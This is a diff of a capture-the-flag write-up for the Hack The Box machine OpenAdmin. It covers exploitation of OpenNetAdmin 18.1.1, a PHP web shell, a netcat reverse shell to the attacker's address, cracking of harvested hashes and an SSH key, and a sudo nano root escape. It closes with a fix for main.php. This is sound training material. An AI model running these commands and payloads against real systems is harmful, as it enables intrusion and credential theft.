@@ -10,38 +10,35 @@ image:
   height: 400   # in pixels
 ---
 
+
 # Overview 
-
 This machine begins w/ a web enumeration, discovering that on  `OpenNetAdmin 1.18.1` is running, it is susceptible to a RCE exploit, allowing us to obtain a low-privilege/`www-data`
-
 user.
 
 For privilege escalation part, we have to privilege escalate to `jimmy`, `joanna` then to `root`.
-
 After enumerating files in `/ona/` directory, `mysql` database credentials is revealed, allowing us to switch to user `jimmy`.
 
 After enumerating the system w/ `linpeas.sh`, `jimmy` belongs to a group `internal` and has `RWX` access to `/var/www/internal`, `/var/www/internal` is being hosted as user `joanna` locally on port 52846, w/ `chisel` we are able to access it on `kali`. Since `jimmy` has write access to `/var/www/internal` directory, simply inserting a web shell and invoking a reverse shell through that will privilege escalate us to user `joanna`.
 
 User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root. `nano` has a GTFOBins entry, allowing us to spawn a `root` shell.
 
+
 ---
 
-| Column       | Details                                                             |
-|--------------|---------------------------------------------------------------------|
-| Box Name     | OpenAdmin                                                           |
-| IP           | 10.10.10.171                                                        |
-| Points       | 20                                                                  |
-| Difficulty   | Easy                                                                |
-| Creator      | [del_KZx497Ju](https://www.hackthebox.com/home/users/profile/82600) |
-| Release Date | 04 Jan 2020                                                         |
+| Column       | Details      |
+| ------------ | ------------ |
+| Box Name     | OpenAdmin    |
+| IP           | 10.10.10.171 |
+| Points       | 20           |
+| Difficulty   | Easy         |
+| Creator      |      [del_KZx497Ju](https://www.hackthebox.com/home/users/profile/82600)         |
+| Release Date |    04 Jan 2020          |
+
 
 # Recon
 
-
 ## TCP/80 (HTTP)
-
 - FFUF
-
 	```
 	301      GET        9l       28w      314c http://10.10.10.171/artwork => http://10.10.10.171/artwork/
 	200      GET      375l      964w    10918c http://10.10.10.171/index.html
@@ -49,28 +46,23 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	403      GET        9l       28w      277c http://10.10.10.171/server-status
 	```
 
+
+
 # Initial Foothold
 
-
 ## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution
-
 1. Found `OpenNetAdmin v18.1.1` running after clicking `Login` from `http://OpenAdmin.htb/music`
 	![](Pasted%20image%2020220925220041.png)
 2. Search exploits for `OpenNetAdmin v18.1.1`
 
 	| Exploit Title                                                | Path                 |
-
 	| ------------------------------------------------------------ | -------------------- |
-
 	| OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | php/webapps/47772.rb |
-
 	| OpenNetAdmin 18.1.1 - Remote Code Execution                  | php/webapps/47691.sh |
-
 3. How does `OpenNetAdmin 18.1.1 - Remote Code Execution` - (`php/webapps/47691.sh`) work?
 	- This module exploits a command injection in OpenNetAdmin between` 8.5.14` and `18.1.1`.
 4. Try `OpenNetAdmin v18.1.1 - Remote Code Execution` - (`php/webapps/47691.sh`)
 	1. Exploit!
-
 		```
 		┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171]
 		└─# sh 47691.sh http://openadmin.htb/ona/
@@ -79,18 +71,14 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 		www-data
 		$
 		```
-
 	2. The shell is unstable, could not upgrade shell to fully interactive tty.
 	3. Create webshell
-
 		```
 		┌──(root💀kali)-[~/htb/OpenAdmin]
 		└─# echo "<?php system(\$_GET['c']);?>" | tee webshell.php
 		<?php system($_GET['c']);?>
 		```
-
 	4. Transfer webshell to `openadmin.htb`
-
 		```
 		┌──(root💀kali)-[~/htb/OpenAdmin]
 		└─# nc -nvlp 4444 < webshell.php
@@ -102,25 +90,20 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 		Ncat: Connection from 10.10.10.171.
 		Ncat: Connection from 10.10.10.171:53832.
 		```
-
 	5. Invoke reverse shell
-
 		```
 		┌──(root💀kali)-[~/htb/OpenAdmin]
 		└─# curl "http://10.10.10.171/ona/webshell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.14%2044
 		44%20%3E%2Ftmp%2Ff"
 		```
-
 5.  Demo - `OpenNetAdmin v18.1.1 - Remote Code Execution`
 	![](WO4vY3wm5C.gif)
 
 
 ## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution (Metasploit)
-
 1. Launch `msfconsole`
 2. Use `unix/webapp/opennetadmin_ping_cmd_injection`
 3. Set `OPTIONS`
-
 	```
 	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS 10.10.10.171
 	RHOSTS => 10.10.10.171
@@ -129,9 +112,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload 8
 	payload => linux/x64/meterpreter/reverse_tcp
 	```
-
 4. View `OPTIONS`
-
 	```
 	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > show options
 	
@@ -163,36 +144,30 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	   --  ----
 	   0   Automatic Target
 	```
-
 5. Exploit!
 	![](Pasted%20image%2020220926040313.png)
 
+
+
 # Privilege Escalation
 
-
 ## Jimmy - Enumeration (Found Jimmy Creds)
-
 1. Since we saw a login page earlier, there should be a database configuration file, enumerate the system for configuration files
-
 	```
 	www-data@openadmin:/opt/ona$ find . 2>/dev/null | grep config
 	./www/config
 	./www/config/auth_ldap.config.php
 	./www/config/config.inc.php
 	```
-
 2. View `config.inc.php`
-
 	```
 	www-data@openadmin:/opt/ona$ cat ./www/config/config.inc.php | grep -n "db\|database"
 	...
 	176:$dbconffile = "{$base}/local/config/database_settings.inc.php";
 	...
 	```
-
 	- Points to a file w/ database configuration
 3. Found credentials at  `local/config/database_settings.inc.php`
-
 	```php
 	www-data@openadmin:/opt/ona$ cat www/local/config/database_settings.inc.php
 	<?php
@@ -219,28 +194,21 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	
 	?>
 	```
-
 	- `ona_sys:n1nj4W4rri0R!`
 4. Switch to `jimmy` w/ `n1nj4W4rri0R!`
-
 	```
 	www-data@openadmin:/opt/ona$ su jimmy
 	Password: n1nj4W4rri0R!
 	jimmy@openadmin:/opt/ona$
 	```
 
-
 ## Extract MySQL Database Hashes & Crack
-
 1. Connect to `mysql` w/ `ona_sys:n1nj4W4rri0R!`
-
 	```
 	www-data@openadmin:/opt/ona$ mysql -u ona_sys -p
 	Enter password:
 	```
-
 2. Extract hashes from `users` table from `ona` database
-
 	```
 	mysql > use ona_default
 	mysql> SELECT username, password FROM users;
@@ -251,9 +219,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	| admin    | 21232f297a57a5a743894a0e4a801fc3 |
 	+----------+----------------------------------+
 	```
-
 3. Identify the hash
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# nth -f hash --no-banner
@@ -274,10 +240,8 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
 	Domain Cached Credentials, HC: 1100 JtR: mscach
 	```
-
 	- `raw-md5`
 4. Crack hash w/ `hashcat`
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --show
@@ -287,18 +251,14 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 
 
 ## Joanna - Enumeration
-
 1. View groups for user `admin`
-
 	```
 	jimmy@openadmin:/var/www/internal$ groups
 	jimmy internal
 	```
-
 	- `internal`
 2. Found something interesting w/ `linpeas.sh`
 	![](Pasted%20image%2020220926011836.png)
-
 	>  - An internal port `TCP/52846`
 	 > - Virtual Host is running as user `joanna`, 
 	 > - Virtual Host web root directory: `/var/www/internal`
@@ -306,29 +266,21 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	 > - User `jimmy` has write access to the web root directory.
 	{: .prompt-info}
 
-
 ## Joanna - How to privilege escalate w/ the info we have?
-
 1. Analyzing the information we have
 	1. Since Virtual Host is configured to run as user `joanna`, commands executed by the webserver will be executed as user `joanna`.
 	2. User `jimmy` has write access to the web root directory `/var/www/internal`, this means we can write a web shell, and invoke a reverse shell through the webshell to obtain `joanna` shell.
 	3. We have to use SSH Tunnel/Chisel in order to access `TCP/52846` on `kali`
 
-
 ## Joanna - Setup SSH Tunnel/Chisel 
-
 1. Setup SSH Tunnel
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin]
 	└─# ssh -L52846:127.0.0.1:52846 jimmy@openadmin.htb
 	```
-
 	> On `kali`, port 52846 is forwarded to `openadmin.htb` on port 52846
 	{: .prompt-info}
-
 2. Enumerate `TCP/52846` on `kali`
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin]
 	└─# nmap -sV -sC localhost -p52846
@@ -341,10 +293,8 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	|_http-server-header: Apache/2.4.29 (Ubuntu)
 	|_http-title: Tutorialspoint.com
 	```
-
 3. OR use `chisel`
 	-  `kali`
-
 		```
 		┌──(root💀kali)-[~/htb/OpenAdmin]
 		└─# chisel server --reverse --port 1337
@@ -352,35 +302,25 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 		2022/09/26 01:46:59 server: Fingerprint tW7cYmw1k5JhH4eZ9m62QDga8zuBVNteoY4tiaxbFvY=
 		2022/09/26 01:46:59 server: Listening on http://0.0.0.0:1337
 		```
-
 	- `openadmin.htb`
-
 		```
 		jimmy@openadmin:/tmp$ ./chisel client 10.10.14.14:1337 R:52846:127.0.0.1:52846 &
 		```
 
-
 ## Joanna - Insert Webshell & Create joannabash
-
 1. Insert webshell 
-
 	```
 	jimmy@openadmin:/var/www/internal$ echo "<?php system(\$_GET['c'])?>" | tee webshell.php
 	<?php system($_GET['c'])?>
 	```
-
 2. Test if our webshell works
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# curl localhost:52846/webshell.php?c=id
 	uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
 	```
-
 	![](Pasted%20image%2020220926015451.png)
-
 3. Create a `joannabash`, bash w/ `joanna` setuid
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# curl "localhost:52846/webshell.php?c=cp+/bin/bash+./joannabash;chmod+4755+./joannabash;+ls+-la"
@@ -396,38 +336,29 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	-rw-r--r-- 1 joanna joanna         5 Sep 25 17:56 testing
 	-rw-rw-r-- 1 jimmy  jimmy         27 Sep 25 17:52 webshell.php
 	```
-
 4. Execute `joannabash` to privilege escalate
-
 	```
 	jimmy@openadmin:/var/www/internal$ ./joannabash -p
 	joannabash-4.4$ id;whoami
 	uid=1000(jimmy) gid=1000(jimmy) euid=1001(joanna) groups=1000(jimmy),1002(internal)
 	joanna
 	```
-
 5. Demo - Insert webshell & create `jonnabash` 
 	![](suBh3On9h2.gif)
 6. Found `joanna` encrytped SSH private key.
-
 	```
 	joannabash-4.4$ ls -la /home/joanna | grep .ssh
 	drwx------ 2 joanna joanna 4096 Nov 23  2019 .ssh
 	```
 
-
 ## Joanna - Crack SSH Private Key
-
 1. Transfer `id_rsa` to `kali`
 2. Convert it to john format
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# python ssh2john.py id_rsa > john_id_rsa
 	```
-
 3. Crack w/ `john`
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# john john_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
@@ -439,9 +370,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	Press 'q' or Ctrl-C to abort, almost any other key for status
 	bloodninjas      (id_rsa)
 	```
-
 4. SSH w/ `id_rsa` & `bloodninjas`
-
 	```
 	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
 	└─# sshpass -P "Enter passphrase" -p 'bloodninjas' ssh joanna@openadmin.htb -i id_rsa
@@ -474,9 +403,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 
 
 ##  Root - Enumeration
-
 1. Check `joanna`'s sudo access
-
 	```
 	joanna@openadmin:~$ sudo -l
 	Matching Defaults entries for joanna on openadmin:
@@ -486,27 +413,23 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	User joanna may run the following commands on openadmin:
 	    (ALL) NOPASSWD: /bin/nano /opt/priv
 	```
-
 	- `/bin/nano` - has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/nano/#sudo)
 
 
-## Root - SUID/SUDO GTFOBINS
 
+## Root - SUID/SUDO GTFOBINS
 1. How do we exploit `nano`
 	- If the `nano` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges
 	- We are able to spawn a `root` shell w/ `nano` shortcuts
 2. Exploit `nano`
 	1. Execute `sudo /bin/nano /opt/priv` 
 	2. Type this
-
 		```
 		CTRL+R, CTRL+X 
 		# Type
 		reset; sh 1>&0 2>&0
 		```
-
 	3.  `root` shell obtained
-
 		```
 		Command to execute: reset; sh 1>&0 2>&0#
 		#  Get Help         ^X Read File
@@ -515,18 +438,15 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 		uid=0(root) gid=0(root) groups=0(root)
 		root
 		```
-
 3. Demo - `GTFOBins nano`
 	![](dn6WAwGVBq.gif)
 
+
 # Additional
 
-
 ## Joana - Login & Obtain SSH Private
-
 1. Instead of inserting a webshell, we can login to `TCP/52846`, revealing `joanna` SSH private key
 2. Since we have `RWX` on `/var/www/internal`, view  `index.php`
-
 	```php
 	jimmy@openadmin:/var/www/internal$ cat index.php | grep password
 	         .form-signin input[type="password"] {
@@ -536,7 +456,6 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	            <input type = "password" class = "form-control"
 	               name = "password" required>
 	```
-
 	- Found hash
 3. Crack Hash w/ [dcode](https://www.dcode.fr/sha512-hash)
 	![](Pasted%20image%2020220926042206.png)
@@ -545,9 +464,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 
 
 ## Fix main.php
-
 1.  `main.php` is missing `die` command, if we were to `curl` `main.php`, SSH private key will still be displayed
-
 	```
 	jimmy@openadmin:~$ curl -s localhost:52846/main.php
 	<pre>-----BEGIN RSA PRIVATE KEY-----
@@ -585,12 +502,9 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	Click here to logout <a href="logout.php" tite = "Logout">Session
 	</html>
 	```
-
 	>  This because `die` is not used to terminate the remaining code, after it checks whether username is set, it continues to execute `PHP` code, instead of just exiting the page.
 	{: .prompt-info}
-
 2. Fix `main.php`
-
 	```php
 	<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); die; };
 	# Open Admin Trusted
@@ -603,15 +517,11 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	Click here to logout <a href="logout.php" tite = "Logout">Session
 	</html>
 	```
-
 3. Now if we were to `curl` `main.php`, nothing is displayed.
-
 	```
 	jimmy@openadmin:~$ curl -s localhost:52846/main.php
 	```
-
 4. Add a valid cookie to view `main.php`
-
 	```
 	jimmy@openadmin:~$ curl -s localhost:52846/main.php -H "Cookie: PHPSESSID=27606qebvn7cqbmgua0r1323m1"
 	<pre>-----BEGIN RSA PRIVATE KEY-----
